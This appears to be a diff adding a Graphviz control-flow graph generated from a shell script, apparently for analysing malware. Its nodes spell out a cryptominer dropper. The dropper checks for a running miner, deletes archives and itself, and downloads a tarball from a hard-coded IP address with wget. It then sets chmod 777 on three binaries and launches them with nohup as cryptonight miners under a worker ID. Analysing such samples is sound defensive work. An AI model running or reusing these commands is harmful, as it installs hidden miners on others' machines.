@@ -1,0 +1,94 @@
+digraph {
+74 [label="rm -f /tmp/httpdlog/*.gz "];
+74 -> 74
+76 [label="rm -f *.gz "];
+76 -> 76
+22 [label="rm -f *.sh "];
+22 -> 22
+88 [label="rm -f $0 "];
+88 -> 88
+8 [label="ret=`ps -ef|grep  qwe15884889.01 |grep -v grep` "];
+8 -> 8
+10 [label="ps -ef "];
+10 -> 12 [label="N,N,N,"];
+12 [label="grep qwe15884889.01 "];
+12 -> 14 [label="N,"];
+14 [label="grep -v grep "];
+14 -> 16 [label="N,"];
+16 [label="[ -n $ret ] "];
+16 -> 74 [label="SC,N,if,"];
+74 [label="rm -f /tmp/httpdlog/*.gz "];
+74 -> 76 [label="then,"];
+76 [label="rm -f *.gz "];
+76 -> 22 [label="\n,"];
+22 [label="rm -f *.sh "];
+22 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 88 [label="\n,"];
+88 [label="rm -f $0 "];
+88 -> 52 [label="\n,"];
+52 [label="echo yes "];
+52 -> 54 [label="\n,"];
+54 [label="mkdir /tmp/.httpdlog "];
+54 -> 56 [label="\n,else,"];
+56 [label="cd /tmp/.httpdlog "];
+56 -> 58 [label="\n,"];
+58 [label="typeos=`getconf LONG_BIT` "];
+58 -> 60 [label="\n,"];
+60 [label="getconf LONG_BIT "];
+60 -> 62 [label="N,N,"];
+62 [label="[ $typeos = 64 ] "];
+62 -> 64 [label="\n,SC,N,if,"];
+64 [label="wget http://119.249.54.100:8846/mall.tar.gz -O my.tar.gz "];
+64 -> 66 [label="then,"];
+66 [label="tar zxvf my.tar.gz "];
+66 -> 68 [label="fi,\n,"];
+68 [label="chmod 777 ./mstbcn "];
+68 -> 70 [label="\n,"];
+70 [label="chmod 777 ./mstrie "];
+70 -> 72 [label="\n,"];
+72 [label="chmod 777 ./mstxcn "];
+72 -> 74 [label="\n,"];
+74 [label="rm -f /tmp/httpdlog/*.gz "];
+74 -> 76 [label="\n,"];
+76 [label="rm -f *.gz "];
+76 -> 78 [label="\n,"];
+78 [label="nohup ./mstbcn -a cryptonight -o bcn -u qwe15884889.01 -p x -B /dev/null "];
+78 -> 86 [label="\n,"];
+86 [label="/dev/null "];
+86 -> 86
+81 [label="nohup ./mstrie -m -o ric -u qwe15884889.02 -p x /dev/null "];
+81 -> 86 [label="&,"];
+86 [label="/dev/null "];
+86 -> 86
+84 [label="nohup ./mstxcn -a m7 -o bcn -u qwe15884889.01 -p x /dev/null "];
+84 -> 86 [label="&,"];
+86 [label="/dev/null "];
+86 -> 86
+87 [label="echo ok "];
+87 -> 88 [label="&,"];
+}
